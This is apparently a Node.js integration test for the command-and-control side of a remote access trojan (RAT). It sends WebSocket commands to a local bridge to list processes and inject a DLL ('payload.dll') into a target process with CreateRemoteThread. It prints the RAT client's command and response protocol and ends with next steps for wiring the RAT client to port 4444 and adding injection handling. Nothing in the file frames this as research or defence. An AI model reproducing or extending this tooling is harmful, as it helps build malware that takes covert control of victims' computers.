// Test script for injection integration
const WebSocket = require('ws');

console.log('Testing Process Injection Integration...\n');

// Test WebSocket connection
const ws = new WebSocket('ws://localhost:8080');

ws.on('open', () => {
    console.log('✅ Connected to bridge WebSocket');
    
    // Test 1: Get processes (requires clientId)
    console.log('\n📋 Test 1: Get Processes');
    const testMessage1 = {
        type: 'get_processes',
        clientId: 'test-client-123'  // This will fail since client doesn't exist
    };
    ws.send(JSON.stringify(testMessage1));
    console.log('Sent: get_processes (will fail - no client connected)');
    
    // Test 2: Inject DLL
    console.log('\n💉 Test 2: Inject DLL');
    const testMessage2 = {
        type: 'inject_dll',
        clientId: 'test-client-123',
        pid: 1234,
        dllPath: 'C:\\test\\payload.dll',
        method: 'createremotethread'
    };
    ws.send(JSON.stringify(testMessage2));
    console.log('Sent: inject_dll (will fail - no client connected)');
    
    // Test 3: Valid command structure
    console.log('\n✅ Test 3: Valid Command Structure');
    console.log('Expected WebSocket messages:');
    console.log('1. {"type":"get_processes","clientId":"client-uuid"}');
    console.log('2. {"type":"inject_dll","clientId":"client-uuid","pid":1234,"dllPath":"C:\\\\path\\\\to\\\\dll.dll","method":"createremotethread"}');
    
    console.log('\nExpected RAT client commands:');
    console.log('1. PROCESS_LIST');
    console.log('2. INJECT_DLL|1234|C:\\path\\to\\dll.dll|createremotethread');
    
    console.log('\nExpected RAT client responses:');
    console.log('1. PROCESS_LIST_RESPONSE|[{"pid":1234,"name":"explorer.exe",...}]');
    console.log('2. INJECTION_RESULT|true|1234|5678|');
});

ws.on('message', (data) => {
    const message = JSON.parse(data.toString());
    console.log('\n📨 Received from bridge:', JSON.stringify(message, null, 2));
    
    if (message.type === 'error') {
        console.log('❌ Expected error:', message.message);
    }
});

ws.on('error', (error) => {
    console.log('❌ WebSocket error:', error.message);
});

ws.on('close', () => {
    console.log('\n🔌 WebSocket closed');
    console.log('\n✅ Integration test complete!');
    console.log('\nNext steps:');
    console.log('1. Start bridge server: node bridge/index.js');
    console.log('2. Connect RAT client to localhost:4444');
    console.log('3. Update RAT client to handle PROCESS_LIST and INJECT_DLL commands');
    console.log('4. Test with real client connection');
});

// Auto-close after 5 seconds
setTimeout(() => {
    ws.close();
}, 5000);